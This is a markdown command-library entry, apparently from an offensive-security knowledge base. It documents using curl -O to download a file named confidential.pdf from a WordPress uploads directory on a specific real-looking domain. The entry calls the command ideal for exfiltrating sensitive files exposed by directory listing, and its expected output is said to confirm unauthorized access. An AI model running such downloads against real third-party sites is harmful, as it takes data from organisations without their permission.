---
id: cmd-curl-download-file
data: 'curl -O http://www.mtn.co.sz/wp-content/uploads/2020/01/confidential.pdf'
tags:
  - web
  - download
  - exfiltration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T05:32:10.066Z'
verified: false
validated: true
submitted: true
---
# curl-download-file

## Command

```bash
curl -O http://www.mtn.co.sz/wp-content/uploads/2020/01/confidential.pdf
```

## Description

This command downloads a specific file from an exposed web directory using curl's -O option to save it with the original filename. It is ideal for exfiltrating sensitive files discovered via directory listing in information disclosure attacks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-O` | Saves the response with the remote filename | Yes |
| `URL` | Full path to the target file (e.g., http://target.com/path/to/file.pdf) | Yes |

## Examples

### Basic Usage

```bash
curl -O http://target.com/wp-content/uploads/file.jpg
```

### Advanced Usage

```bash
curl -O -L http://target.com/wp-content/uploads/2020/confidential.pdf
```

Follows redirects (-L) for robustness.

## Expected Output

The file is downloaded to the current directory without errors, confirming unauthorized access (e.g., no 404 or 403 response).

## Related

- [[commands/curl-list-directory]]
- [[procedures/Access-WordPress-Uploads-Directory-Listing]]
